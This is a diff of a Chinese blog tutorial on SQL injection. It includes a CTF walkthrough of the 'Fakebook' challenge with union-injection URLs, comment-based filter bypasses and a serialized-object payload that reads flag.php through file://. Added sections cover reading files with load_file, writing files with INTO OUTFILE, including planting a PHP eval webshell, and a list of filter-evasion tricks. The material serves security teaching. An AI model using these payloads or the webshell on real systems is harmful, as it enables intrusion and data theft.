@@ -80,7 +80,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">3.2k</span>
+            <span class="post-count">4.1k</span>
         </span>
     </span>
 
@@ -89,7 +89,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">13 min</span>
+            <span class="post-count">17 min</span>
         </span>
     </span>
 </div>
@@ -161,8 +161,8 @@
 <li>利用一些函数。例如 rand()函数等。?sort&#x3D;rand(sql 语句) Ps：此处我们可以展示一下 rand(ture)和 rand(false)的结果是不一样的</li>
 <li>利用 and，例如?sort&#x3D;1 and (加 sql 语句)。 同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造</li>
 </ul>
-<h2 id="2、联合查询注入"><a href="#2、联合查询注入" class="headerlink" title="2、联合查询注入"></a><strong><font size=3>2、联合查询注入</font></strong></h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（1）union操作符用于合并两个或多个SQL语句集合起来。一般与order  by语句配合使用<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（2）先测试字段长度：a’ order by1#% 、a’ order by2#% 、a’ order by3#% 、a’ order by4#%，当测试到：a’ order by 4#% 时：出现页面错误，那么可以确定，查询的字段长度为3。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（4）构造语句：a’ union select database(),user(),version()#%   </p>
-<p><strong><font size=2>2.1、联合查询注入例子（功防世界Fakebook）</font></strong>  </p>
+<h2 id="7、联合查询注入"><a href="#7、联合查询注入" class="headerlink" title="7、联合查询注入"></a><strong><font size=4>7、联合查询注入</font></strong></h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（1）union操作符用于合并两个或多个SQL语句集合起来。一般与order  by语句配合使用<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（2）先测试字段长度：a’ order by1#% 、a’ order by2#% 、a’ order by3#% 、a’ order by4#%，当测试到：a’ order by 4#% 时：出现页面错误，那么可以确定，查询的字段长度为3。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（4）构造语句：a’ union select database(),user(),version()#%   </p>
+<p><strong><font size=3>7.1、联合查询注入例子（功防世界Fakebook）</font></strong>  </p>
 <p><img src="/pic/usql/usql1.png"><br>通过join按钮创建一个账户<br><img src="/pic/usql/usql2.png"><br>猜测存在SQL注入漏洞<br><img src="/pic/usql/usql3.png"><br>判断出为整数型注入(1 and 1&#x3D;2报错)<br><img src="/pic/usql/usql4.png"><br>尝试联合查询注入<code>http://61.147.171.105:56102/view.php?no=1%20order%20by%205#</code>出错，一共四列）<br>查询数据库<code>http://61.147.171.105:56102/view.php?no=1%20union%20select%20databases();#</code><br><img src="/pic/usql/usql5.png"><br>查询被过滤，利用&#x2F;**&#x2F;绕过<code>http://61.147.171.105:56102/view.php?no=1%20union/**/select%201,2,3,4;#</code><br><img src="/pic/usql/usql6.png"><br>判断显示位为第二位<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,2,3,4;#</code>（传递的no值必须不为显示位的值）<br><img src="/pic/usql/usql7.png"><br>爆库为fakebook<code>（http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,database(),3,4;#）</code><br><img src="/pic/usql/usql8.png"><br>列出库中表<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.TABLES%20where%20table_schema=%27fakebook%27;#</code><br><img src="/pic/usql/usql9.png"><br>列出表中字段<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27;#</code><br><img src="/pic/usql/usql10.png"><br>查看data字段中值<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(data),3,4%20from%20users;#</code><br><img src="/pic/usql/usql11.png"><br>这一段话是序列化的字符串，2.看文中的提示&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php,我们也可以去猜测flag.php有可能在统一文件夹下，如&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  </p>
 <p>访问robots.txt文件后可获取源码,其中<code>function get($url)</code>函数中cuit_init()用来初始化一个curl会话，curl可以使用file伪协议读取文件。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">		class UserInfo</span><br><span class="line">	&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"> </span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();   #初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close() 函数使用。 </span><br><span class="line"> </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); #curl_setopt — 设置一个cURL传输选项。 CURLOPT_URL需要获取的URL地址，也可以在curl_init()函数中设置</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  # CURLOPT_RETURNTRANSFER 	将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。 </span><br><span class="line">        $output = curl_exec($ch);  #执行一个cURL会话</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);#//抓取URL并把它传递给浏览器，CURLINFO_HTTP_CODE最后一个收到的HTTP代码 </span><br><span class="line">        if($httpCode == 404) &#123;  </span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);// 关闭cURL资源，并且释放系统资源</span><br><span class="line"> </span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">结合以上代码我们可以知道，flag可能在/var/www/html/flag.php且传入的参数被序列化了且传入的变量有$name、$age、$blog,且我们需要用到伪协议file:///。最终们要构建的payload，满足这些条件的代码如下：</span><br></pre></td></tr></table></figure>
@@ -180,9 +180,45 @@ echo(serialize($a));
 </code></pre>
 <p>运行后可得<br>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ </p>
 <p>最后一步构建的paylod为<br><code>http://111.200.241.244:52692/view.php?no=2union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; #</code>（传入的序列化参数需要加上  ‘’）<br><img src="/pic/usql/usql12.png"><br>打开源代码查看base64编码的flag<br><img src="/pic/usql/usql13.png"><br>OR<br>猜测flag文件路径，利用load_file直接读取flag（<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,load_file(%27/var/www/html/flag.php%27),3,4;#</code>）<br><img src="/pic/usql/usql14.png"><br>附加数据库知识：<br><img src="/pic/usql/usql15.png">  </p>
-<h2 id="4、sqlmap注入"><a href="#4、sqlmap注入" class="headerlink" title="4、sqlmap注入"></a><strong><font size=3>4、sqlmap注入</font></strong></h2><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。  </p>
+<h2 id="8、sqlmap注入"><a href="#8、sqlmap注入" class="headerlink" title="8、sqlmap注入"></a><strong><font size=4>8、sqlmap注入</font></strong></h2><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。  </p>
 <p>sqlmap注入例题：<br><img src="/pic/ssql/ssql1.png"><br>输入hello，页面正常显示内容<br><img src="/pic/ssql/ssql2.png"><br>输入hello’，页面显示空白，猜测存在字符型SQL注入漏洞<br><img src="/pic/ssql/ssql3.png"><br>检查网页代码发现页面使用POST请求用search参数发送了数据<br><img src="/pic/ssql/ssql4.png"><br>利用BP抓包将请求复制到test.txt文件中，利用sqlmap的命令sqlmap.py -r test.txt，将以POST请求检测注入<br><img src="/pic/ssql/ssql5.png"><br>利用sqlmap检测所存在的数据库<br><img src="/pic/ssql/ssql6.png"><br>获取数据库表<br><img src="/pic/ssql/ssql7.png"><br>获取表中列<br><img src="/pic/ssql/ssql8.png"><br>获取列的值<br><img src="/pic/ssql/ssql9.png">  </p>
-<h2 id="5、报错注入"><a href="#5、报错注入" class="headerlink" title="5、报错注入"></a><strong><font size=3>5、报错注入</font></strong></h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a></p>
+<h2 id="9、文件操作"><a href="#9、文件操作" class="headerlink" title="9、文件操作"></a><strong><font size=4>9、文件操作</font></strong></h2><p><strong>1、load_file()导出文件</strong><br>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br><code>-1 union select 1,1,1,load_file(c:\\boot.ini)</code><br>使用条件：<br>(1)必须有权限读取并且文件必须完全可读；and (select count(<em>) from mysql.user)&gt;0&#x2F;</em> 如果结果返回正常,说明具有读写权限，and (select count(<em>) from mysql.user)&gt;0&#x2F;</em> 返回错误，应该是管理员给数据库帐户降权<br>(2)欲读取文件必须在服务器上<br>(3)必须指定文件完整的路径（常见路径：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5729087.html%EF%BC%89">http://www.cnblogs.com/lcamry/p/5729087.html）</a><br>(4)欲读取文件必须小于 max_allowed_packet<br><strong>2、文件导入到数据库</strong><br>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必 须为一个文字字符串。<br><code>load data infile &#39;/tmp/t0.txt&#39; ignore into table t0 character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;</code>:将&#x2F;tmp&#x2F;t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是 每一项数据之间的分隔符，lines terminated by 是行的结尾符.当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 &#x2F;tmp 等文件夹。<br><strong>3、导入到文件</strong><br><code>SELECT.....INTO OUTFILE &#39;file_name</code><br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。<br><strong>直接将 select 内容导入到文件</strong>中：<code>Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</code><br><strong>导入一句话木马</strong>：<code>Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</code><br><strong>修改文件结尾</strong>：<code>Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件</code><br><strong>将服务器当中的内容导入到 web 服务器下的目录</strong>:<code>select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php</code>  </p>
+<h2 id="10、针对字符过滤"><a href="#10、针对字符过滤" class="headerlink" title="10、针对字符过滤"></a><strong><font size=4>10、针对字符过滤</font></strong></h2><h2 id="10-1-注释符-、–-的过滤绕过"><a href="#10-1-注释符-、–-的过滤绕过" class="headerlink" title="10.1 注释符#、–+的过滤绕过"></a><strong><font size=3>10.1 注释符#、–+的过滤绕过</font></strong></h2><p><strong>方法1</strong>：闭合所有的字符，例如同时闭合前单引号和后单引号：<code>-1&#39; union select 1,@@datadir,’3</code><br>完成闭合后可使用各种注入方式实现注入<br><strong>方法2</strong>：二次排序注入，将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。<br>例如：注册一个账号名为admin’#,登录账号admin’#后修改此账号的密码，此时SQL语句更新密码的操作为：<code>UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#39; admin&#39;</code>,其实是更新了admin的密码，实现攻击。  </p>
+<h2 id="10-2-or、and的过滤绕过"><a href="#10-2-or、and的过滤绕过" class="headerlink" title="10.2 or、and的过滤绕过"></a><strong><font size=3>10.2 or、and的过滤绕过</font></strong></h2><ul>
+<li>变换大小写：Or,OR,oR</li>
+<li>hex&#x2F;url编码</li>
+<li>添加注释&#x2F;*or*&#x2F;</li>
+<li>利用符号 and&#x3D;&amp;&amp;,or&#x3D;||</li>
+</ul>
+<h2 id="10-3-空格过滤绕过"><a href="#10-3-空格过滤绕过" class="headerlink" title="10.3 空格过滤绕过"></a><strong><font size=3>10.3 空格过滤绕过</font></strong></h2><ul>
+<li>%09：TAB键（水平）</li>
+<li>%0a：新建一行</li>
+<li>%0c：新的一页</li>
+<li>%0d：return</li>
+<li>%ob：TAB(垂直)</li>
+<li>%a0：空格</li>
+</ul>
+<h2 id="11、常见函数和查询语句"><a href="#11、常见函数和查询语句" class="headerlink" title="11、常见函数和查询语句"></a><strong><font size=4>11、常见函数和查询语句</font></strong></h2><p>1、系统函数  </p>
+<ul>
+<li>version()：数据库版本</li>
+<li>user()：数据库用户名</li>
+<li>database（）：数据库名</li>
+<li>@@datadir：数据库路径</li>
+<li>@@version_compile_os:操作系统版本</li>
+</ul>
+<p>2、字符串连接函数  </p>
+<ul>
+<li>concat(str1,str2,…):没有分隔符的连接字符串</li>
+<li>concat_ws(separator,str1,str2,…):有分隔符的连接字符串</li>
+<li>group_concat(str1,str2,…):连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+</ul>
+<p>3、information_schema表常见SQL查询语句  </p>
+<ul>
+<li>查数据库名：<code>select schema_name from information_schema.schemata</code></li>
+<li>查某库的数据表名：<code>select table_name from information_schema.tables where table_schema=’xxxxx’</code></li>
+<li>查表的所有列:<code>Select column_name from information_schema.columns where table_name=’xxxxx’</code></li>
+<li>获取某列的数据:<code>select 1,username,password f rom users where id=2</code></li>
+</ul>
  
       <!-- reward -->
       
